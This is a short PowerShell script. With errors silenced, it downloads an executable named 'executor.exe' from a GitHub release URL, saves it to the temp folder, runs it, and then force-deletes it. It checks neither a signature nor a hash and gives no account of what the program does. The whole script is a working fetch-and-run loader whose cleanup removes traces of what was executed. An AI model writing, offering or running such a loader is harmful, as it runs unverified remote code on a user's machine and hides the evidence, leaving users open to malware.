$ErrorActionPreference = "SilentlyContinue"

$url = "https://github.com/q7dll/executor/releases/latest/download/executor.exe"
$tempPath = "$env:TEMP\q7dll_ss_tool.exe"

Invoke-WebRequest -Uri $url -OutFile $tempPath

if (Test-Path $tempPath) {
Start-Process -FilePath $tempPath -Wait
Remove-Item $tempPath -Force
} else {
Write-Host "Couldn't download the file." -ForegroundColor Red
Start-Sleep -Seconds 3
}
